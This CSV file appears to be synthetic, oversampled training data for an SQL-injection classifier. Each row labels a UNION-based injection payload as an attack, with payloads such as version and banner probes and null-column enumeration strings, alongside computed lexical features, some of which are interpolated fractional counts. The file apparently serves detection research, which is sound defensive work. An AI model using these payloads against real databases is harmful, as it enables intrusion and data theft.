id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000015,0.06552159612518685,76.0,33.0,4.439993102099514,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,1.0,5.889463273167839,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000012,attack,union,"1"" where 8672  =  8672 union all select null,null#",nearest_attack_euclidean,R000287,0.18303283043176116,51.24936945182583,22.91670870321161,3.993698636138352,27.99949556146066,9.0,10.0,4.249873890365166,0.5449974778073033,0.17654020767186693,0.1961557863020744,0.08230652821875538,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.2498738903651652,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000175,0.09738736664015253,84.81359501803372,17.0,3.157577389765491,50.65087601442697,1.0,18.0,15.162719003606743,0.5971099296830096,0.011795934320755264,0.21232681777359458,0.17876731822264055,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,8.162719003606743,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000089,0.06079147884397928,78.62033947517159,21.84813579006864,3.5402792949380784,14.0,43.69627158013728,8.0,12.92406789503432,0.17812440084632186,0.5557151074107585,0.10178537191218394,0.1643751198307356,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.92406789503432,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,0.28849325106662926,60.621530320126794,16.0,3.2228424541218064,40.990747520338125,1.0,8.756939359746408,9.873843440042265,0.6756165419150084,0.016500415398494395,0.1450540018042726,0.16282904088222447,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.1261565599577346,0.0,0.0,5.747686880084531,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,union,"1' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000179,0.045934803498402385,60.86769476410296,15.014700581766338,3.0794550007296366,45.88239534586929,1.0,4.0,9.985299418233662,0.7537554088743035,0.016435152974746847,0.06574061189898744,0.1640688262519621,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.014700581766338428,0.0,6.970598836467323,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,union,"-7240'   )    )    union all select 8064,8064,8064#",nearest_attack_euclidean,R000127,0.6883581473566567,48.59064336621766,21.655806195173952,3.9345803787820737,14.0,16.0,11.934837171043712,6.655806195173952,0.2895414406742214,0.33090450362768153,0.24260592183430574,0.1369481338637914,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.6558061951739522,0.0,0.0,2.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000018,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.6188078292051558,81.62646415294724,27.08430943529816,3.9070231298345757,40.0,3.5421547176490797,25.542154717649083,12.54215471764908,0.4902020231750166,0.04329713628811516,0.3129082490343743,0.1535925915024939,3.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,5.08430943529816,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000019,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R000232,0.35291596445585505,51.2225595256713,18.55548809486574,3.8403062462556457,14.0,25.77804762053704,4.0,7.44451190513426,0.27395471150438466,0.5025634560809538,0.07827277471553847,0.14520905769912307,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.44451190513426,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000055,1.0823717081008022,84.32564430513645,22.308974593224033,3.666822583320203,19.0,43.707695118688385,10.0,11.617949186448064,0.22657084550563927,0.5164348187885124,0.11924781342402067,0.13774652228182768,0.0,0.6910254067759678,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,6.926923779672096,4.0,0.0,0.6910254067759678,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000021,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000028,0.7090983487646358,97.33930229966134,25.339302299661348,4.0381370988257155,63.0,4.0,23.0,7.33930229966135,0.6472358463203592,0.04109433944891169,0.23629245183124226,0.0753773623994868,0.0,0.0,2.0,0.0,1.0000000000000002,2.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.3393022996613503,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,1.9999999999999998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000022,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,0.8803894640791018,44.868680150757285,18.782490686767638,3.862470701747151,14.0,16.694944120605825,8.0,6.173736030151456,0.31996129054577305,0.3611959443943684,0.18283502316901315,0.13600774189084539,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.1737360301514568,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000103,1.207388132745487,60.87856677597402,25.417459283549782,4.097370893033584,22.626188925324673,18.417459283549782,13.626188925324673,6.208729641774891,0.37253431691844924,0.30435761640056025,0.22133052309014511,0.10177754359084543,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.6043648208874454,0.0,0.0,0.6043648208874459,4.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6043648208874453,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000308,0.9014337935650374,67.1618363444259,22.43236726888518,3.802953707453139,38.56763273111482,9.0,12.594203613311073,7.0,0.5769404123261238,0.13447045597952142,0.18400099926583813,0.10458813242851667,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.43236726888517896,0.0,0.0,3.5676327311148213,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.21618363444258942,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000264,0.21997836395073725,56.824018655089674,17.0,3.3029128395482714,38.0,1.0,8.686682212574725,9.137336442514945,0.6703485533368153,0.017640751403600413,0.15122427906078445,0.16078641619879988,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.137336442514945,1.0,0.0,5.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000018,1.146431426068579,79.52233237927655,29.82134096578764,4.062234316556098,40.0,2.522332379276545,24.04466475855309,12.95533524144691,0.503023212789389,0.03168031538042626,0.30229665683581225,0.1629998149943725,3.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000027,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,1.1472187155343248,35.743036469711015,16.552460653204893,3.64816652511405,15.447539346795107,8.019266796313454,8.0,4.2762303266024455,0.4461978837171411,0.20840595505956636,0.22739804123274523,0.11799811999054732,0.0,0.0,2.638115163301223,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6381151633012228,2.638115163301223,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000028,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R000237,1.3289146354340455,54.73482749828908,23.473482749828907,4.029651933860045,19.0,17.893930999315632,11.89393099931563,5.946965499657816,0.3500127591775025,0.3263131033310521,0.21578275832763028,0.10789137916381514,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.4734827498289077,0.0,0.0,0.4734827498289076,4.0,1.0,0.0,1.0,0.0,0.0,1.0,0.4734827498289078,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000190,2.2609041927636415,97.65226008691906,27.513374612041574,4.030848495779356,48.46501551833701,18.75411762878992,15.0,15.433126939792126,0.4776482010109161,0.2085677494449825,0.15635570733399196,0.15742834221010948,3.0,0.0,2.5133746120415745,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.919752327750551,5.5133746120415745,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000030,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000281,0.3186523992653475,108.78498768816245,28.972009849470048,4.205456583854899,37.0,39.02799015052996,17.0,15.75699753763249,0.3402558835963627,0.35858696182093486,0.15633378435508558,0.14482337022761685,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.756997537632488,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000031,attack,union,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",nearest_attack_euclidean,R000072,0.5147258941581857,79.43458364151783,22.858645910379458,3.786441006638893,14.0,42.86916728303568,8.84812453772324,13.71729182075892,0.1763019455622944,0.5392124510552746,0.11190350228383497,0.172582101098596,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.14135408962054,0.8586459103794599,0.0,8.71729182075892,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000032,attack,union,"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",nearest_attack_euclidean,R000124,0.4989329582531239,83.7423058852932,20.67423058852932,3.5256071582316335,14.0,38.696922354117284,16.696922354117284,14.348461177058642,0.16772767840064118,0.46229885197738096,0.19872678591923063,0.17124668370274723,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.674230588529321,0.0,0.0,7.674230588529321,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
